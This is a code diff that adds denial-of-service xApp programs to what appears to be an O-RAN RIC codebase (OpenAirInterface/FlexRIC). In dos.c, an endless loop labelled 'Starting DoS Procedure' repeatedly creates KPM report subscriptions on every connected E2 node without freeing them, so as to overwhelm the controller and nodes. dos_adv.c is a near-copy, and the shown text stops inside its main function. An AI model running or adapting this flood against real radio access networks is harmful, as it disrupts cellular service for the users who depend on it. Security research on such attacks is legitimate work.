diff --git a/examples/xApp/c/CMakeLists.txt b/examples/xApp/c/CMakeLists.txt
index 981391c6..4601b8e0 100644
--- a/examples/xApp/c/CMakeLists.txt
+++ b/examples/xApp/c/CMakeLists.txt
@@ -1,3 +1,4 @@
+add_subdirectory(sub_dos)
 add_subdirectory(ctrl)
 add_subdirectory(helloworld)
 add_subdirectory(monitor)
diff --git a/examples/xApp/c/monitor/xapp_kpm_moni.c b/examples/xApp/c/monitor/xapp_kpm_moni.c
index cde38345..6eae808a 100644
--- a/examples/xApp/c/monitor/xapp_kpm_moni.c
+++ b/examples/xApp/c/monitor/xapp_kpm_moni.c
@@ -371,7 +371,7 @@ int main(int argc, char *argv[])
     assert(kpm_handle[i].success == true);
   }
 
-  sleep(10);
+  sleep(120);
 
   for(int i = 0; i < nodes.len; ++i){
     // Remove the handle previously returned
diff --git a/examples/xApp/c/sub_dos/CMakeLists.txt b/examples/xApp/c/sub_dos/CMakeLists.txt
new file mode 100755
index 00000000..1a421fd4
--- /dev/null
+++ b/examples/xApp/c/sub_dos/CMakeLists.txt
@@ -0,0 +1,27 @@
+add_executable(xapp_dos
+  dos.c
+  ../../../../src/util/alg_ds/alg/defer.c
+  )
+
+ target_link_libraries(xapp_dos
+ 						PUBLIC
+ 						e42_xapp
+ 						-pthread
+ 						-lsctp
+ 						-ldl
+ 						)
+
+
+
+add_executable(xapp_dos_adv
+dos_adv.c
+../../../../src/util/alg_ds/alg/defer.c
+)
+
+target_link_libraries(xapp_dos_adv
+                    PUBLIC
+                    e42_xapp
+                    -pthread
+                    -lsctp
+                    -ldl
+                    )
\ No newline at end of file
diff --git a/examples/xApp/c/sub_dos/dos.c b/examples/xApp/c/sub_dos/dos.c
new file mode 100755
index 00000000..ab59cfea
--- /dev/null
+++ b/examples/xApp/c/sub_dos/dos.c
@@ -0,0 +1,438 @@
+/*
+ * Licensed to the OpenAirInterface (OAI) Software Alliance under one or more
+ * contributor license agreements.  See the NOTICE file distributed with
+ * this work for additional information regarding copyright ownership.
+ * The OpenAirInterface Software Alliance licenses this file to You under
+ * the OAI Public License, Version 1.1  (the "License"); you may not use this
+ *file except in compliance with the License. You may obtain a copy of the
+ *License at
+ *
+ *      http://www.openairinterface.org/?page_id=698
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ *-------------------------------------------------------------------------------
+ * For more information about the OpenAirInterface (OAI) Software Alliance:
+ *      contact@openairinterface.org
+ */
+
+#include "../../../../src/sm/rc_sm/ie/ir/ran_param_list.h"
+#include "../../../../src/sm/rc_sm/ie/ir/ran_param_struct.h"
+#include "../../../../src/util/alg_ds/ds/lock_guard/lock_guard.h"
+#include "../../../../src/util/time_now_us.h"
+#include "../../../../src/xApp/e42_xapp_api.h"
+#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <unistd.h>
+
+static byte_array_t copy_str_to_ba(const char *str) {
+  assert(str != NULL);
+
+  size_t const sz = strlen(str);
+  byte_array_t dst = {.len = sz};
+  dst.buf = calloc(sz, sizeof(uint8_t));
+  assert(dst.buf != NULL);
+
+  memcpy(dst.buf, str, sz);
+
+  return dst;
+}
+
+static ue_id_e2sm_t ue_id;
+
+static pthread_mutex_t mtx;
+
+static void sm_cb_kpm(sm_ag_if_rd_t const *rd) {
+  assert(rd != NULL);
+  assert(rd->type == INDICATION_MSG_AGENT_IF_ANS_V0);
+  assert(rd->ind.type == KPM_STATS_V3_0);
+
+  kpm_ind_data_t const *kpm = &rd->ind.kpm.ind;
+
+  int64_t now = time_now_us();
+  printf("[KPM RC]: KPM ind_msg latency = %ld Î¼s\n",
+         now - kpm->hdr.kpm_ric_ind_hdr_format_1.collectStartTime);
+
+#if defined KPM_V2_03 || defined KPM_V3_00
+  printf("[KPM RC]: Sojourn time %lf \n", kpm->msg.frm_3.meas_report_per_ue[0]
+                                              .ind_msg_format_1.meas_data_lst[0]
+                                              .meas_record_lst[0]
+                                              .real_val);
+  {
+    lock_guard(&mtx);
+    free_ue_id_e2sm(&ue_id);
+    ue_id =
+        cp_ue_id_e2sm(&kpm->msg.frm_3.meas_report_per_ue[0].ue_meas_report_lst);
+  }
+  printf("[KPM RC]: UE ID %ld \n ", ue_id.gnb.amf_ue_ngap_id);
+#endif
+}
+
+static kpm_event_trigger_def_t gen_ev_trig(uint64_t period) {
+  kpm_event_trigger_def_t dst = {0};
+
+  dst.type = FORMAT_1_RIC_EVENT_TRIGGER;
+  dst.kpm_ric_event_trigger_format_1.report_period_ms = period;
+
+  return dst;
+}
+
+static meas_info_format_1_lst_t gen_meas_info_format_1_lst(const char *action) {
+  meas_info_format_1_lst_t dst = {0};
+
+  dst.meas_type.type = NAME_MEAS_TYPE;
+  // ETSI TS 128 552
+  dst.meas_type.name = copy_str_to_ba(action);
+
+  dst.label_info_lst_len = 1;
+  dst.label_info_lst = calloc(1, sizeof(label_info_lst_t));
+  assert(dst.label_info_lst != NULL && "Memory exhausted");
+  dst.label_info_lst[0].noLabel = calloc(1, sizeof(enum_value_e));
+  assert(dst.label_info_lst[0].noLabel != NULL && "Memory exhausted");
+  *dst.label_info_lst[0].noLabel = TRUE_ENUM_VALUE;
+
+  return dst;
+}
+
+static kpm_act_def_format_1_t gen_act_def_frmt_1(const char *action) {
+  kpm_act_def_format_1_t dst = {0};
+
+  dst.gran_period_ms = 100;
+
+  // [1, 65535]
+  dst.meas_info_lst_len = 1;
+  dst.meas_info_lst = calloc(1, sizeof(meas_info_format_1_lst_t));
+  assert(dst.meas_info_lst != NULL && "Memory exhausted");
+
+  *dst.meas_info_lst = gen_meas_info_format_1_lst(action);
+
+  return dst;
+}
+
+#if defined KPM_V2_03 || KPM_V3_00
+static kpm_act_def_format_4_t gen_act_def_frmt_4(const char *action) {
+  kpm_act_def_format_4_t dst = {0};
+
+  // [1, 32768]
+  dst.matching_cond_lst_len = 1;
+
+  dst.matching_cond_lst = calloc(dst.matching_cond_lst_len,
+                                 sizeof(matching_condition_format_4_lst_t));
+  assert(dst.matching_cond_lst != NULL && "Memory exhausted");
+
+  // Hack. Subscribe to all UEs with CQI greater than 0 to get a list of all
+  // available UEs in the RAN
+  dst.matching_cond_lst[0].test_info_lst.test_cond_type = CQI_TEST_COND_TYPE;
+  dst.matching_cond_lst[0].test_info_lst.CQI = TRUE_TEST_COND_TYPE;
+
+  dst.matching_cond_lst[0].test_info_lst.test_cond =
+      calloc(1, sizeof(test_cond_e));
+  assert(dst.matching_cond_lst[0].test_info_lst.test_cond != NULL &&
+         "Memory exhausted");
+  *dst.matching_cond_lst[0].test_info_lst.test_cond = GREATERTHAN_TEST_COND;
+
+  dst.matching_cond_lst[0].test_info_lst.test_cond_value =
+      calloc(1, sizeof(test_cond_value_t));
+  assert(dst.matching_cond_lst[0].test_info_lst.test_cond_value != NULL &&
+         "Memory exhausted");
+  dst.matching_cond_lst[0].test_info_lst.test_cond_value->type =
+      INTEGER_TEST_COND_VALUE;
+  dst.matching_cond_lst[0].test_info_lst.test_cond_value->int_value =
+      malloc(sizeof(int64_t));
+  assert(dst.matching_cond_lst[0].test_info_lst.test_cond_value->int_value !=
+             NULL &&
+         "Memory exhausted");
+  *dst.matching_cond_lst[0].test_info_lst.test_cond_value->int_value = 0;
+
+  // Action definition Format 1
+  dst.action_def_format_1 = gen_act_def_frmt_1(action); // 8.2.1.2.1
+
+  return dst;
+}
+#endif
+
+static kpm_act_def_t gen_act_def(const char *act) {
+  kpm_act_def_t dst = {0};
+
+#ifdef KPM_V2_01
+  dst.type = FORMAT_1_ACTION_DEFINITION;
+  dst.frm_1 = gen_act_def_frmt_1(act);
+#elif defined KPM_V2_03 || KPM_V3_00
+  dst.type = FORMAT_4_ACTION_DEFINITION;
+  dst.frm_4 = gen_act_def_frmt_4(act);
+#endif
+  return dst;
+}
+
+typedef enum {
+  DRB_QoS_Configuration_7_6_2_1 = 1,
+  QoS_flow_mapping_configuration_7_6_2_1 = 2,
+  Logical_channel_configuration_7_6_2_1 = 3,
+  Radio_admission_control_7_6_2_1 = 4,
+  DRB_termination_control_7_6_2_1 = 5,
+  DRB_split_ratio_control_7_6_2_1 = 6,
+  PDCP_Duplication_control_7_6_2_1 = 7,
+} rc_ctrl_service_style_1_e;
+
+static e2sm_rc_ctrl_hdr_frmt_1_t gen_rc_ctrl_hdr_frmt_1(void) {
+  e2sm_rc_ctrl_hdr_frmt_1_t dst = {0};
+
+  // 6.2.2.6
+  {
+    lock_guard(&mtx);
+    dst.ue_id = cp_ue_id_e2sm(&ue_id);
+  }
+  // CONTROL Service Style 1: Radio Bearer Control
+  dst.ric_style_type = 1;
+
+  // QoS flow mapping conf
+  dst.ctrl_act_id = QoS_flow_mapping_configuration_7_6_2_1;
+
+  return dst;
+}
+
+static e2sm_rc_ctrl_hdr_t gen_rc_ctrl_hdr(void) {
+  e2sm_rc_ctrl_hdr_t dst = {0};
+  // Radio Bearer Control
+  dst.format = FORMAT_1_E2SM_RC_CTRL_HDR;
+  dst.frmt_1 = gen_rc_ctrl_hdr_frmt_1();
+  return dst;
+}
+
+typedef enum {
+  DRB_ID_8_4_2_2 = 1,
+  LIST_OF_QOS_FLOWS_MOD_IN_DRB_8_4_2_2 = 2,
+  QOS_FLOW_ITEM_8_4_2_2 = 3,
+  QOS_FLOW_ID_8_4_2_2 = 4,
+  QOS_FLOW_MAPPING_IND_8_4_2_2 = 5,
+} qos_flow_mapping_conf_e;
+
+static e2sm_rc_ctrl_msg_frmt_1_t gen_rc_ctrl_msg_frmt_1_qos_flow_map() {
+  e2sm_rc_ctrl_msg_frmt_1_t dst = {0};
+
+  // 8.4.2.2 QoS flow mapping configuration
+  dst.sz_ran_param = 2;
+  dst.ran_param = calloc(2, sizeof(seq_ran_param_t));
+  assert(dst.ran_param != NULL && "Memory exhausted");
+
+  dst.ran_param[0].ran_param_id = DRB_ID_8_4_2_2;
+  dst.ran_param[0].ran_param_val.type =
+      ELEMENT_KEY_FLAG_TRUE_RAN_PARAMETER_VAL_TYPE;
+  dst.ran_param[0].ran_param_val.flag_true =
+      calloc(1, sizeof(ran_parameter_value_t));
+  assert(dst.ran_param[0].ran_param_val.flag_true != NULL &&
+         "Memory exhausted");
+
+  // Let's suppose that it is the DRB 5
+  dst.ran_param[0].ran_param_val.flag_true->type = INTEGER_RAN_PARAMETER_VALUE;
+  dst.ran_param[0].ran_param_val.flag_true->int_ran = 5;
+
+  // List of QoS Flows to be modified in DRB
+  dst.ran_param[1].ran_param_id = LIST_OF_QOS_FLOWS_MOD_IN_DRB_8_4_2_2;
+  dst.ran_param[1].ran_param_val.type = LIST_RAN_PARAMETER_VAL_TYPE;
+  dst.ran_param[1].ran_param_val.lst = calloc(1, sizeof(ran_param_list_t));
+  assert(dst.ran_param[1].ran_param_val.lst != NULL && "Memory exhausted");
+  ran_param_list_t *rpl = dst.ran_param[1].ran_param_val.lst;
+
+  rpl->sz_lst_ran_param = 1;
+  rpl->lst_ran_param = calloc(1, sizeof(lst_ran_param_t));
+  assert(rpl->lst_ran_param != NULL && "Memory exhausted");
+
+  // QoS Flow Item
+  // Bug in the standard. RAN Parameter List 9.3.13
+  // has a mandatory ie RAN Parameter ID 9.3.8
+  // and a mandatory ie RAN Parameter Structure 9.3.12
+  // However, the ASN
+  // RANParameter-LIST ::= SEQUENCE {
+  // list-of-ranParameter  SEQUENCE (SIZE(1..maxnoofItemsinList)) OF
+  // RANParameter-STRUCTURE,
+  // ..
+  // }
+  //
+  // Misses RAN Parameter ID and only has RAN Parameter Structure
+
+  // rpl->lst_ran_param[0].ran_param_id = QOS_FLOW_ITEM_8_4_2_2;
+
+  rpl->lst_ran_param[0].ran_param_struct.sz_ran_param_struct = 2;
+  rpl->lst_ran_param[0].ran_param_struct.ran_param_struct =
+      calloc(2, sizeof(seq_ran_param_t));
+  assert(rpl->lst_ran_param[0].ran_param_struct.ran_param_struct != NULL &&
+         "Memory exhausted");
+  seq_ran_param_t *rps =
+      rpl->lst_ran_param[0].ran_param_struct.ran_param_struct;
+
+  // QoS Flow Identifier
+  rps[0].ran_param_id = QOS_FLOW_ID_8_4_2_2;
+  rps[0].ran_param_val.type = ELEMENT_KEY_FLAG_TRUE_RAN_PARAMETER_VAL_TYPE;
+  rps[0].ran_param_val.flag_true = calloc(1, sizeof(ran_parameter_value_t));
+  assert(rps[0].ran_param_val.flag_true != NULL && "Memory exhausted");
+  rps[0].ran_param_val.flag_true->type = INTEGER_RAN_PARAMETER_VALUE;
+  // Let's suppose that we have QFI 10
+  rps[0].ran_param_val.flag_true->int_ran = 10;
+
+  // QoS Flow Mapping Indication
+  rps[1].ran_param_id = QOS_FLOW_MAPPING_IND_8_4_2_2;
+  rps[1].ran_param_val.type = ELEMENT_KEY_FLAG_FALSE_RAN_PARAMETER_VAL_TYPE;
+  rps[1].ran_param_val.flag_false = calloc(1, sizeof(ran_parameter_value_t));
+  assert(rps[1].ran_param_val.flag_false != NULL && "Memory exhausted");
+
+  // ENUMERATED (ul, dl, ...)
+  rps[1].ran_param_val.flag_false->type = INTEGER_RAN_PARAMETER_VALUE;
+  rps[1].ran_param_val.flag_false->int_ran = 1;
+
+  return dst;
+}
+
+static e2sm_rc_ctrl_msg_t gen_rc_ctrl_msg(void) {
+  e2sm_rc_ctrl_msg_t dst = {0};
+
+  // Radio Bearer Control
+  dst.format = FORMAT_1_E2SM_RC_CTRL_MSG;
+  // dst.frmt_1 = gen_rc_ctrl_msg_frmt_1();
+  dst.frmt_1 = gen_rc_ctrl_msg_frmt_1_qos_flow_map();
+
+  return dst;
+}
+
+int main(int argc, char *argv[]) {
+  fr_args_t args = init_fr_args(argc, argv);
+
+  // Init the xApp
+  init_xapp_api(&args);
+  sleep(1);
+
+  e2_node_arr_t nodes = e2_nodes_xapp_api();
+  assert(nodes.len > 0);
+
+  printf("[KPM RC]: Connected E2 nodes = %d\n", nodes.len);
+
+  sm_ans_xapp_t *h = calloc(nodes.len, sizeof(sm_ans_xapp_t));
+  assert(h != NULL && "Memory exhausted");
+
+  pthread_mutexattr_t attr = {0};
+  int rc = pthread_mutex_init(&mtx, &attr);
+  assert(rc == 0);
+
+  printf("--------------Starting DoS Procedure...------------------------\n");
+  while (1) {
+    // e2_node_arr_t nodes = e2_nodes_xapp_api();
+    ////////////
+    // START KPM
+    ////////////
+    kpm_sub_data_t kpm_sub = {0};
+
+    // KPM Event Trigger
+    uint64_t period_ms = 100;
+    kpm_sub.ev_trg_def = gen_ev_trig(period_ms);
+
+    const int KPM_ran_function = 2;
+
+    for (size_t i = 0; i < nodes.len; ++i) {
+      // KPM Action Definition
+      kpm_sub.sz_ad = 1;
+      kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
+      assert(kpm_sub.ad != NULL && "Memory exhausted");
+
+      ngran_node_t const t = nodes.n[i].id.type;
+      bool du_or_gnb = t == ngran_gNB || t == ngran_gNB_DU;
+      const char *act = du_or_gnb ? "DRB.RlcSduDelayDl" : "DRB.PdcpSduVolumeDL";
+      *kpm_sub.ad = gen_act_def(act);
+
+      h[i] = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub,
+                                sm_cb_kpm);
+      assert(h[i].success == true);
+
+      free_kpm_sub_data(&kpm_sub);
+    }
+  }
+
+  ////////////
+  // START KPM
+  ////////////
+  kpm_sub_data_t kpm_sub = {0};
+
+  // KPM Event Trigger
+  uint64_t period_ms = 100;
+  kpm_sub.ev_trg_def = gen_ev_trig(period_ms);
+
+  const int KPM_ran_function = 2;
+
+  for (size_t i = 0; i < nodes.len; ++i) {
+    // KPM Action Definition
+    kpm_sub.sz_ad = 1;
+    kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
+    assert(kpm_sub.ad != NULL && "Memory exhausted");
+
+    ngran_node_t const t = nodes.n[i].id.type;
+    bool du_or_gnb = t == ngran_gNB || t == ngran_gNB_DU;
+    const char *act = du_or_gnb ? "DRB.RlcSduDelayDl" : "DRB.PdcpSduVolumeDL";
+    *kpm_sub.ad = gen_act_def(act);
+
+    h[i] = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub,
+                              sm_cb_kpm);
+    assert(h[i].success == true);
+
+    free_kpm_sub_data(&kpm_sub);
+  }
+
+  ////////////
+  // END KPM
+  ////////////
+
+  sleep(5);
+
+  ////////////
+  // START RC
+  ////////////
+
+  // RC On Demand report
+  //  rc_sub_data_t rc_sub = {0};
+  //  defer({ free_rc_sub_data(&rc_sub); });
+  //  sm_ans_xapp_t h_2 = report_sm_xapp_api(&nodes.n[0].id, RC_ran_function,
+  //  &rc_sub, sm_cb_rc); assert(h_2.success == true);
+
+  // RC Control
+  rc_ctrl_req_data_t rc_ctrl = {0};
+
+  rc_ctrl.hdr = gen_rc_ctrl_hdr();
+  rc_ctrl.msg = gen_rc_ctrl_msg();
+
+  const int RC_ran_function = 3;
+
+  for (size_t i = 0; i < nodes.len; ++i) {
+    ngran_node_t const t = nodes.n[i].id.type;
+    if (t == ngran_gNB || t == ngran_gNB_CU)
+      control_sm_xapp_api(&nodes.n[i].id, RC_ran_function, &rc_ctrl);
+  }
+  free_rc_ctrl_req_data(&rc_ctrl);
+
+  ////////////
+  // END RC
+  ////////////
+
+  sleep(5);
+
+  for (int i = 0; i < nodes.len; ++i) {
+    // Remove the handle previously returned
+    rm_report_sm_xapp_api(h[i].u.handle);
+  }
+
+  sleep(1);
+  // Stop the xApp
+  while (try_stop_xapp_api() == false)
+    usleep(1000);
+
+  free(h);
+
+  free_e2_node_arr(&nodes);
+
+  rc = pthread_mutex_destroy(&mtx);
+  assert(rc == 0);
+
+  printf("[KPM RC]: Test xApp run SUCCESSFULLY\n");
+}
diff --git a/examples/xApp/c/sub_dos/dos_adv.c b/examples/xApp/c/sub_dos/dos_adv.c
new file mode 100755
index 00000000..b6b4fea6
--- /dev/null
+++ b/examples/xApp/c/sub_dos/dos_adv.c
@@ -0,0 +1,432 @@
+/*
+ * Licensed to the OpenAirInterface (OAI) Software Alliance under one or more
+ * contributor license agreements.  See the NOTICE file distributed with
+ * this work for additional information regarding copyright ownership.
+ * The OpenAirInterface Software Alliance licenses this file to You under
+ * the OAI Public License, Version 1.1  (the "License"); you may not use this
+ *file except in compliance with the License. You may obtain a copy of the
+ *License at
+ *
+ *      http://www.openairinterface.org/?page_id=698
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ *-------------------------------------------------------------------------------
+ * For more information about the OpenAirInterface (OAI) Software Alliance:
+ *      contact@openairinterface.org
+ */
+
+#include "../../../../src/sm/rc_sm/ie/ir/ran_param_list.h"
+#include "../../../../src/sm/rc_sm/ie/ir/ran_param_struct.h"
+#include "../../../../src/util/alg_ds/ds/lock_guard/lock_guard.h"
+#include "../../../../src/util/time_now_us.h"
+#include "../../../../src/xApp/e42_xapp_api.h"
+#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <unistd.h>
+
+static byte_array_t copy_str_to_ba(const char *str) {
+  assert(str != NULL);
+
+  size_t const sz = strlen(str);
+  byte_array_t dst = {.len = sz};
+  dst.buf = calloc(sz, sizeof(uint8_t));
+  assert(dst.buf != NULL);
+
+  memcpy(dst.buf, str, sz);
+
+  return dst;
+}
+
+static ue_id_e2sm_t ue_id;
+
+static pthread_mutex_t mtx;
+
+static void sm_cb_kpm(sm_ag_if_rd_t const *rd) {
+  assert(rd != NULL);
+  assert(rd->type == INDICATION_MSG_AGENT_IF_ANS_V0);
+  assert(rd->ind.type == KPM_STATS_V3_0);
+
+  kpm_ind_data_t const *kpm = &rd->ind.kpm.ind;
+
+#if defined KPM_V2_03 || defined KPM_V3_00
+
+  {
+    lock_guard(&mtx);
+    free_ue_id_e2sm(&ue_id);
+    ue_id =
+        cp_ue_id_e2sm(&kpm->msg.frm_3.meas_report_per_ue[0].ue_meas_report_lst);
+  }
+
+#endif
+}
+
+static kpm_event_trigger_def_t gen_ev_trig(uint64_t period) {
+  kpm_event_trigger_def_t dst = {0};
+
+  dst.type = FORMAT_1_RIC_EVENT_TRIGGER;
+  dst.kpm_ric_event_trigger_format_1.report_period_ms = period;
+
+  return dst;
+}
+
+static meas_info_format_1_lst_t gen_meas_info_format_1_lst(const char *action) {
+  meas_info_format_1_lst_t dst = {0};
+
+  dst.meas_type.type = NAME_MEAS_TYPE;
+  // ETSI TS 128 552
+  dst.meas_type.name = copy_str_to_ba(action);
+
+  dst.label_info_lst_len = 1;
+  dst.label_info_lst = calloc(1, sizeof(label_info_lst_t));
+  assert(dst.label_info_lst != NULL && "Memory exhausted");
+  dst.label_info_lst[0].noLabel = calloc(1, sizeof(enum_value_e));
+  assert(dst.label_info_lst[0].noLabel != NULL && "Memory exhausted");
+  *dst.label_info_lst[0].noLabel = TRUE_ENUM_VALUE;
+
+  return dst;
+}
+
+static kpm_act_def_format_1_t gen_act_def_frmt_1(const char *action) {
+  kpm_act_def_format_1_t dst = {0};
+
+  dst.gran_period_ms = 100;
+
+  // [1, 65535]
+  dst.meas_info_lst_len = 1;
+  dst.meas_info_lst = calloc(1, sizeof(meas_info_format_1_lst_t));
+  assert(dst.meas_info_lst != NULL && "Memory exhausted");
+
+  *dst.meas_info_lst = gen_meas_info_format_1_lst(action);
+
+  return dst;
+}
+
+#if defined KPM_V2_03 || KPM_V3_00
+static kpm_act_def_format_4_t gen_act_def_frmt_4(const char *action) {
+  kpm_act_def_format_4_t dst = {0};
+
+  // [1, 32768]
+  dst.matching_cond_lst_len = 1;
+
+  dst.matching_cond_lst = calloc(dst.matching_cond_lst_len,
+                                 sizeof(matching_condition_format_4_lst_t));
+  assert(dst.matching_cond_lst != NULL && "Memory exhausted");
+
+  // Hack. Subscribe to all UEs with CQI greater than 0 to get a list of all
+  // available UEs in the RAN
+  dst.matching_cond_lst[0].test_info_lst.test_cond_type = CQI_TEST_COND_TYPE;
+  dst.matching_cond_lst[0].test_info_lst.CQI = TRUE_TEST_COND_TYPE;
+
+  dst.matching_cond_lst[0].test_info_lst.test_cond =
+      calloc(1, sizeof(test_cond_e));
+  assert(dst.matching_cond_lst[0].test_info_lst.test_cond != NULL &&
+         "Memory exhausted");
+  *dst.matching_cond_lst[0].test_info_lst.test_cond = GREATERTHAN_TEST_COND;
+
+  dst.matching_cond_lst[0].test_info_lst.test_cond_value =
+      calloc(1, sizeof(test_cond_value_t));
+  assert(dst.matching_cond_lst[0].test_info_lst.test_cond_value != NULL &&
+         "Memory exhausted");
+  dst.matching_cond_lst[0].test_info_lst.test_cond_value->type =
+      INTEGER_TEST_COND_VALUE;
+  dst.matching_cond_lst[0].test_info_lst.test_cond_value->int_value =
+      malloc(sizeof(int64_t));
+  assert(dst.matching_cond_lst[0].test_info_lst.test_cond_value->int_value !=
+             NULL &&
+         "Memory exhausted");
+  *dst.matching_cond_lst[0].test_info_lst.test_cond_value->int_value = 0;
+
+  // Action definition Format 1
+  dst.action_def_format_1 = gen_act_def_frmt_1(action); // 8.2.1.2.1
+
+  return dst;
+}
+#endif
+
+static kpm_act_def_t gen_act_def(const char *act) {
+  kpm_act_def_t dst = {0};
+
+#ifdef KPM_V2_01
+  dst.type = FORMAT_1_ACTION_DEFINITION;
+  dst.frm_1 = gen_act_def_frmt_1(act);
+#elif defined KPM_V2_03 || KPM_V3_00
+  dst.type = FORMAT_4_ACTION_DEFINITION;
+  dst.frm_4 = gen_act_def_frmt_4(act);
+#endif
+  return dst;
+}
+
+typedef enum {
+  DRB_QoS_Configuration_7_6_2_1 = 1,
+  QoS_flow_mapping_configuration_7_6_2_1 = 2,
+  Logical_channel_configuration_7_6_2_1 = 3,
+  Radio_admission_control_7_6_2_1 = 4,
+  DRB_termination_control_7_6_2_1 = 5,
+  DRB_split_ratio_control_7_6_2_1 = 6,
+  PDCP_Duplication_control_7_6_2_1 = 7,
+} rc_ctrl_service_style_1_e;
+
+static e2sm_rc_ctrl_hdr_frmt_1_t gen_rc_ctrl_hdr_frmt_1(void) {
+  e2sm_rc_ctrl_hdr_frmt_1_t dst = {0};
+
+  // 6.2.2.6
+  {
+    lock_guard(&mtx);
+    dst.ue_id = cp_ue_id_e2sm(&ue_id);
+  }
+  // CONTROL Service Style 1: Radio Bearer Control
+  dst.ric_style_type = 1;
+
+  // QoS flow mapping conf
+  dst.ctrl_act_id = QoS_flow_mapping_configuration_7_6_2_1;
+
+  return dst;
+}
+
+static e2sm_rc_ctrl_hdr_t gen_rc_ctrl_hdr(void) {
+  e2sm_rc_ctrl_hdr_t dst = {0};
+  // Radio Bearer Control
+  dst.format = FORMAT_1_E2SM_RC_CTRL_HDR;
+  dst.frmt_1 = gen_rc_ctrl_hdr_frmt_1();
+  return dst;
+}
+
+typedef enum {
+  DRB_ID_8_4_2_2 = 1,
+  LIST_OF_QOS_FLOWS_MOD_IN_DRB_8_4_2_2 = 2,
+  QOS_FLOW_ITEM_8_4_2_2 = 3,
+  QOS_FLOW_ID_8_4_2_2 = 4,
+  QOS_FLOW_MAPPING_IND_8_4_2_2 = 5,
+} qos_flow_mapping_conf_e;
+
+static e2sm_rc_ctrl_msg_frmt_1_t gen_rc_ctrl_msg_frmt_1_qos_flow_map() {
+  e2sm_rc_ctrl_msg_frmt_1_t dst = {0};
+
+  // 8.4.2.2 QoS flow mapping configuration
+  dst.sz_ran_param = 2;
+  dst.ran_param = calloc(2, sizeof(seq_ran_param_t));
+  assert(dst.ran_param != NULL && "Memory exhausted");
+
+  dst.ran_param[0].ran_param_id = DRB_ID_8_4_2_2;
+  dst.ran_param[0].ran_param_val.type =
+      ELEMENT_KEY_FLAG_TRUE_RAN_PARAMETER_VAL_TYPE;
+  dst.ran_param[0].ran_param_val.flag_true =
+      calloc(1, sizeof(ran_parameter_value_t));
+  assert(dst.ran_param[0].ran_param_val.flag_true != NULL &&
+         "Memory exhausted");
+
+  // Let's suppose that it is the DRB 5
+  dst.ran_param[0].ran_param_val.flag_true->type = INTEGER_RAN_PARAMETER_VALUE;
+  dst.ran_param[0].ran_param_val.flag_true->int_ran = 5;
+
+  // List of QoS Flows to be modified in DRB
+  dst.ran_param[1].ran_param_id = LIST_OF_QOS_FLOWS_MOD_IN_DRB_8_4_2_2;
+  dst.ran_param[1].ran_param_val.type = LIST_RAN_PARAMETER_VAL_TYPE;
+  dst.ran_param[1].ran_param_val.lst = calloc(1, sizeof(ran_param_list_t));
+  assert(dst.ran_param[1].ran_param_val.lst != NULL && "Memory exhausted");
+  ran_param_list_t *rpl = dst.ran_param[1].ran_param_val.lst;
+
+  rpl->sz_lst_ran_param = 1;
+  rpl->lst_ran_param = calloc(1, sizeof(lst_ran_param_t));
+  assert(rpl->lst_ran_param != NULL && "Memory exhausted");
+
+  // QoS Flow Item
+  // Bug in the standard. RAN Parameter List 9.3.13
+  // has a mandatory ie RAN Parameter ID 9.3.8
+  // and a mandatory ie RAN Parameter Structure 9.3.12
+  // However, the ASN
+  // RANParameter-LIST ::= SEQUENCE {
+  // list-of-ranParameter  SEQUENCE (SIZE(1..maxnoofItemsinList)) OF
+  // RANParameter-STRUCTURE,
+  // ..
+  // }
+  //
+  // Misses RAN Parameter ID and only has RAN Parameter Structure
+
+  // rpl->lst_ran_param[0].ran_param_id = QOS_FLOW_ITEM_8_4_2_2;
+
+  rpl->lst_ran_param[0].ran_param_struct.sz_ran_param_struct = 2;
+  rpl->lst_ran_param[0].ran_param_struct.ran_param_struct =
+      calloc(2, sizeof(seq_ran_param_t));
+  assert(rpl->lst_ran_param[0].ran_param_struct.ran_param_struct != NULL &&
+         "Memory exhausted");
+  seq_ran_param_t *rps =
+      rpl->lst_ran_param[0].ran_param_struct.ran_param_struct;
+
+  // QoS Flow Identifier
+  rps[0].ran_param_id = QOS_FLOW_ID_8_4_2_2;
+  rps[0].ran_param_val.type = ELEMENT_KEY_FLAG_TRUE_RAN_PARAMETER_VAL_TYPE;
+  rps[0].ran_param_val.flag_true = calloc(1, sizeof(ran_parameter_value_t));
+  assert(rps[0].ran_param_val.flag_true != NULL && "Memory exhausted");
+  rps[0].ran_param_val.flag_true->type = INTEGER_RAN_PARAMETER_VALUE;
+  // Let's suppose that we have QFI 10
+  rps[0].ran_param_val.flag_true->int_ran = 10;
+
+  // QoS Flow Mapping Indication
+  rps[1].ran_param_id = QOS_FLOW_MAPPING_IND_8_4_2_2;
+  rps[1].ran_param_val.type = ELEMENT_KEY_FLAG_FALSE_RAN_PARAMETER_VAL_TYPE;
+  rps[1].ran_param_val.flag_false = calloc(1, sizeof(ran_parameter_value_t));
+  assert(rps[1].ran_param_val.flag_false != NULL && "Memory exhausted");
+
+  // ENUMERATED (ul, dl, ...)
+  rps[1].ran_param_val.flag_false->type = INTEGER_RAN_PARAMETER_VALUE;
+  rps[1].ran_param_val.flag_false->int_ran = 1;
+
+  return dst;
+}
+
+static e2sm_rc_ctrl_msg_t gen_rc_ctrl_msg(void) {
+  e2sm_rc_ctrl_msg_t dst = {0};
+
+  // Radio Bearer Control
+  dst.format = FORMAT_1_E2SM_RC_CTRL_MSG;
+  // dst.frmt_1 = gen_rc_ctrl_msg_frmt_1();
+  dst.frmt_1 = gen_rc_ctrl_msg_frmt_1_qos_flow_map();
+
+  return dst;
+}
+
+int main(int argc, char *argv[]) {
+  fr_args_t args = init_fr_args(argc, argv);
+
+  // Init the xApp
+  init_xapp_api(&args);
+  sleep(1);
+
